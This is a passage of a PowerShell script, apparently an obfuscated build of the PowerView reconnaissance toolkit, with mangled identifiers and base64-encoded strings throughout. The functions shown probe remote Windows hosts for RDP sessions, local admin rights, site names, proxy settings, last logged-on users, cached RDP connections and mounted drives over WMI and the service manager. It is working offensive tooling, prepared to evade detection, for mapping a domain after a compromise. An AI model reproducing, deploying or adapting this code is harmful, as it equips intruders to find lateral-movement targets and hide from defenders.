                                ${__/\/\/\/\_/\/\__} = $Null
                            }
                            ${___/=\____/====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) ${__/\/\/\/\_/\/\__}
                            ${___/=\____/====\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAEQAUABTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                            ${___/=\____/====\_}
                            $Null = ${/==\_/=\/===\/\__}::WTSFreeMemory(${/=\__/==\_____/=\})
                            ${__/===\/=\/\__/\/=} += ${________/=\/\__/\}
                        }
                    }
                    $Null = ${/==\_/=\/===\/\__}::WTSFreeMemoryEx(2, ${_/\/==\__/\/===\/}, ${/==\____/\/\___/\})
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${___/\____/\_/====}).Message)"
                }
                $Null = ${/==\_/=\/===\/\__}::WTSCloseServer(${/=\/=\/\__/=\/=\_})
            }
            else {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AFIARABQAFMAZQBzAHMAaQBvAG4AXQAgAEUAcgByAG8AcgAgAG8AcABlAG4AaQBuAGcAIAB0AGgAZQAgAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFMAZQBzAHMAaQBvAG4AIABIAG8AcwB0ACAAKABSAEQAIABTAGUAcwBzAGkAbwBuACAASABvAHMAdAApACAAcwBlAHIAdgBlAHIAIABmAG8AcgA6ACAAJAB7AF8AXwBfAF8ALwA9AFwALwA9AFwAXwAvAD0AXAAvAFwALwB9AA==')))
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function _/=\/\_/\_/=====\_ {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${/=\/=\/\__/=\/=\_} = ${/\____/=\/\/=\/\_}::OpenSCManagerW($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBfAF8ALwBcAF8AXwAvAFwALwBcAF8ALwA9AD0APQA9AD0AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F);${___/\____/\_/====} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            ${____/====\__/===\} = New-Object PSObject
            ${____/====\__/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
            if (${/=\/=\/\__/=\/=\_} -ne 0) {
                $Null = ${/\____/=\/\/=\/\_}::CloseServiceHandle(${/=\/=\/\__/=\/=\_})
                ${____/====\__/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] ${___/\____/\_/====}).Message)"
                ${____/====\__/===\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $False
            }
            ${____/====\__/===\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAGQAbQBpAG4AQQBjAGMAZQBzAHMA'))))
            ${____/====\__/===\}
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function ____/\/\_____/\_/= {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            if (${__/\__/\/\_/=====} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQB7ADEALAAzAH0AJAA=')))) {
                ${_/===\_/\___/=\/=} = ${__/\__/\/\_/=====}
                ${__/\__/\/\_/=====} = [System.Net.Dns]::GetHostByAddress(${__/\__/\/\_/=====}) | select -ExpandProperty HostName
            }
            else {
                ${_/===\_/\___/=\/=} = @(_____/=\_/\/==\/\_ -____/=\/=\_/=\/\/ ${__/\__/\/\_/=====})[0].IPAddress
            }
            ${/==\_/\_/\/==\___} = [IntPtr]::Zero
            ${/\_____/=\__/==\_} = ${_/=\/\/===\/\___/}::DsGetSiteName(${__/\__/\/\_/=====}, [ref]${/==\_/\_/\/==\___})
            ${___/\/\/\__/=\/\_} = New-Object PSObject
            ${___/\/\/\__/=\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
            ${___/\/\/\__/=\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${_/===\_/\___/=\/=}
            if (${/\_____/=\__/==\_} -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${/==\_/\_/\/==\___})
                ${___/\/\/\__/=\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] ${/\_____/=\__/==\_}).Message)"
                ${___/\/\/\__/=\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) ''
            }
            ${___/\/\/\__/=\/\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIAUwBpAHQAZQA='))))
            $Null = ${_/=\/\/===\/\___/}::NetApiBufferFree(${/==\_/\_/\/==\___})
            ${___/\/\/\__/=\/\_}
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Get-WMIRegProxy {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = ${Env:____/=\/=\_/=\/\/},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            try {
                ${/==\__/=\/\__/\__} = @{
                    'List' = $True
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                    'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    'Computername' = ${__/\__/\/\_/=====}
                    'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/=\/\__/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                ${_/==\___/\/===\__} = gwmi @/==\__/=\/\__/\__
                ${/=\___/\_/\/=\/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzAA==')))
                ${___/\___/\/==\/=\} = 2147483649
                ${__/====\/===\/\/\} = ${_/==\___/\/===\__}.GetStringValue(${___/\___/\/==\/=\}, ${/=\___/\_/\/=\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA==')))).sValue
                ${______/=\_/\/\/\_} = ${_/==\___/\/===\__}.GetStringValue(${___/\___/\/==\/=\}, ${/=\___/\_/\/=\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA=')))).sValue
                ${___/\/\__/======\} = ''
                if (${______/=\_/\/\/\_} -and (${______/=\_/\/\/\_} -ne '')) {
                    try {
                        ${___/\/\__/======\} = (New-Object Net.WebClient).DownloadString(${______/=\_/\/\/\_})
                    }
                    catch {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAYwBvAG4AbgBlAGMAdABpAG4AZwAgAHQAbwAgAEEAdQB0AG8AQwBvAG4AZgBpAGcAVQBSAEwAIAA6ACAAJAB7AF8AXwBfAF8AXwBfAC8APQBcAF8ALwBcAC8AXAAvAFwAXwB9AA==')))
                    }
                }
                if (${__/====\/===\/\/\} -or ${______/=\_/\/\/\_}) {
                    ${__/\/=\/\/\/==\__} = New-Object PSObject
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))) ${__/====\/===\/\/\}
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))) ${______/=\_/\/\/\_}
                    ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBwAGEAZAA='))) ${___/\/\__/======\}
                    ${__/\/=\/\/\/==\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwB4AHkAUwBlAHQAdABpAG4AZwBzAA=='))))
                    ${__/\/=\/\/\/==\__}
                }
                else {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAATgBvACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHUAbgBkACAAZgBvAHIAIAAkAHsAXwBfAF8AXwAvAD0AXAAvAD0AXABfAC8APQBcAC8AXAAvAH0A')))
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAZQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHIAIAAkAHsAXwBfAF8AXwAvAD0AXAAvAD0AXABfAC8APQBcAC8AXAAvAH0AIAA6ACAAJABfAA==')))
            }
        }
    }
}
function Get-WMIRegLastLoggedOn {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${_/\___/\/===\_/\_} = 2147483650
            ${/==\__/=\/\__/\__} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${__/\__/\/\_/=====}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/=\/\__/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${/=======\/\/=\_/=} = gwmi @/==\__/=\/\__/\__
                ${/=\___/\_/\/=\/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
                ${/==\/==\/\/\___/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
                ${_/\_/\/\/=\/\/=\_} = ${/=======\/\/=\_/=}.GetStringValue(${_/\___/\/===\_/\_}, ${/=\___/\_/\/=\/==}, ${/==\/==\/\/\___/=}).sValue
                ${_/==\/==\/\_/==\_} = New-Object PSObject
                ${_/==\/==\/\_/==\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                ${_/==\/==\/\_/==\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4A'))) ${_/\_/\/\/=\/\/=\_}
                ${_/==\/==\/\_/==\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAGEAcwB0AEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByAA=='))))
                ${_/==\/==\/\_/==\_}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEwAYQBzAHQATABvAGcAZwBlAGQATwBuAF0AIABFAHIAcgBvAHIAIABvAHAAZQBuAGkAbgBnACAAcgBlAG0AbwB0AGUAIAByAGUAZwBpAHMAdAByAHkAIABvAG4AIAAkAHsAXwBfAC8AXABfAF8ALwBcAC8AXABfAC8APQA9AD0APQA9AH0ALgAgAFIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbABpAGsAZQBsAHkAIABuAG8AdAAgAGUAbgBhAGIAbABlAGQALgA=')))
            }
        }
    }
}
function Get-WMIRegCachedRDPConnection {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${/===\__/\_/\/=\/=} = 2147483651
            ${/==\__/=\/\__/\__} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${__/\__/\/\_/=====}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/=\/\__/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${/=======\/\/=\_/=} = gwmi @/==\__/=\/\__/\__
                ${_/=\/=\/==\__/=\/} = (${/=======\/\/=\_/=}.EnumKey(${/===\__/\_/\/=\/=}, '')).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${/==\__/\/\/=\/\/\} in ${_/=\/=\/==\__/=\/}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${/=\/=\_/\_/\/\_/\} = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ ${/==\__/\/\/=\/\/\} -Credential $Credential
                        }
                        else {
                            ${/=\/=\_/\_/\/\_/\} = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ ${/==\__/\/\/=\/\/\}
                        }
                        ${/\_____/\__/\/=\_} = ${/=======\/\/=\_/=}.EnumValues(${/===\__/\_/\/=\/=},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA=')))).sNames
                        ForEach (${__/\/\/==\/==\_/=} in ${/\_____/\__/\/=\_}) {
                            if (${__/\/\/==\/==\_/=} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                                ${/=\/===\/\/===\__} = ${/=======\/\/=\_/=}.GetStringValue(${/===\__/\_/\/=\/=}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA='))), ${__/\/\/==\/==\_/=}).sValue
                                ${/==\_/=======\___} = New-Object PSObject
                                ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                                ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\/=\_/\_/\/\_/\}
                                ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${/==\__/\/\/=\/\/\}
                                ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) ${/=\/===\/\/===\__}
                                ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                                ${/==\_/=======\___}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                                ${/==\_/=======\___}
                            }
                        }
                        ${/=\___/\__/\/=\__} = ${/=======\/\/=\_/=}.EnumKey(${/===\__/\_/\/=\/=},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwA=')))).sNames
                        ForEach ($Server in ${/=\___/\__/\/=\__}) {
                            ${/=\/=\/====\/\/=\} = ${/=======\/\/=\_/=}.GetStringValue(${/===\__/\_/\/=\/=}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwBfAC8AXAAvAFwALwA9AFwALwBcAC8AXAB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwBcACQAUwBlAHIAdgBlAHIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                            ${/==\_/=======\___} = New-Object PSObject
                            ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                            ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\/=\_/\_/\/\_/\}
                            ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${/==\__/\/\/=\/\/\}
                            ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                            ${/==\_/=======\___} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) ${/=\/=\/====\/\/=\}
                            ${/==\_/=======\___}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                            ${/==\_/=======\___}
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgA6ACAAJABfAA==')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJAB7AF8AXwAvAFwAXwBfAC8AXAAvAFwAXwAvAD0APQA9AD0APQB9ACwAIABsAGkAawBlAGwAeQAgAGkAbgBzAHUAZgBmAGkAYwBpAGUAbgB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAbwByACAAZgBpAHIAZQB3AGEAbABsACAAcgB1AGwAZQBzACAAbwBuACAAaABvAHMAdAA6ACAAJABfAA==')))
            }
        }
    }
}
function Get-WMIRegMountedDrive {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${/===\__/\_/\/=\/=} = 2147483651
            ${/==\__/=\/\__/\__} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${__/\__/\/\_/=====}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/=\/\__/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${/=======\/\/=\_/=} = gwmi @/==\__/=\/\__/\__
                ${_/=\/=\/==\__/=\/} = (${/=======\/\/=\_/=}.EnumKey(${/===\__/\_/\/=\/=}, '')).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${/==\__/\/\/=\/\/\} in ${_/=\/=\/==\__/=\/}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${/=\/=\_/\_/\/\_/\} = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ ${/==\__/\/\/=\/\/\} -Credential $Credential
                        }
                        else {
                            ${/=\/=\_/\_/\/\_/\} = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ ${/==\__/\/\/=\/\/\}
                        }
